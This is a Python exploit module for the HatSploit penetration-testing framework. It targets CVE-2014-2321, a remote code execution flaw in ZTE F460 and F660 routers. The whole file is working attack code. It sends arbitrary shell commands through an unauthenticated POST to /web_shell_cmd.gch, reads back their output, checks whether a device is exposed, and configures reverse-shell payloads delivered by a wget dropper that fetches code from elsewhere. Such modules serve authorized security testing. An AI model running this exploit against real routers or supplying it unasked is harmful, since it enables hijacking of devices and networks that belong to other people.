"""
This module requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

import re

from hatsploit.lib.core.module.basic import *
from hatsploit.lib.core.module.proto import HTTP


class HatSploitModule(Module, Handler, HTTP):
    def __init__(self):
        super().__init__({
            'Category': "exploit",
            'Name': "ZTE F460 & F660 Remote Code Execution",
            'Module': "exploit/linux/zte/f460_f660_rce",
            'Authors': [
                "Ivan Nikolskiy (enty8080) - module developer",
                "Rapid7 - vulnerability researcher",
            ],
            'Description': "Remote Code Execution in ZTE F460 and F660.",
            'Platform': OS_LINUX,
            'Rank': HIGH_RANK,
            'Payload': {
                PayloadInlineMixin: {
                    'Value': "unix/generic/netcat_reverse_tcp",
                    'Platform': [OS_LINUX, OS_UNIX],
                    'Arch': [ARCH_GENERIC],
                },
                PayloadDropMixin: {
                    'Value': "linux/mipsle/shell_reverse_tcp",
                    'Platform': [OS_LINUX],
                    'Arch': [ARCH_MIPSLE, ARCH_MIPSBE],
                }
            },
            'References': [
                {'URL': 'https://www.tenable.com/plugins/nessus/73104'},
                {'URL': 'https://www.kb.cert.org/vuls/id/600724'},
                {'URL': 'https://nvd.nist.gov/vuln/detail/CVE-2014-2321'},
                {'CVE': '2014-2321'}
            ],
            'DisclosureDate': "2014-03-19",
            'Notes': {
                'Stability': [CRASH_SAFE],
                'Reliability': [RELIABLE_SESSION],
                'SideEffects': [],
            }
        })

    def __call__(self):
        self.dropper.set('wget')

    def exploit(self, command):
        data = {
            "IF_ACTION": 'apply',
            "IF_ERRORSTR": 'SUCC',
            "IF_ERRORPARAM": 'SUCC',
            "IF_ERRORTYPE": '-1',
            "Cmd": command,
            "CmdAck": '',
        }

        response = self.http_request(
            method="POST",
            path='/web_shell_cmd.gch',
            data=data,
        )

        regexp = '<textarea cols="" rows="" id="Frm_CmdAck" class="textarea_1">(.*?)</textarea>'
        output = re.findall(regexp, response.text, re.DOTALL)

        if len(output):
            return output[0]

    def check(self):
        response = self.http_request(
            method="GET",
            path="/web_shell_cmd.gch"
        )

        if response is None or response.status_code != 200:
            return False

        return True

    def run(self):
        self.module_handle(
            concat="&&",
            linemax=100,
            sender=self.exploit,
        )
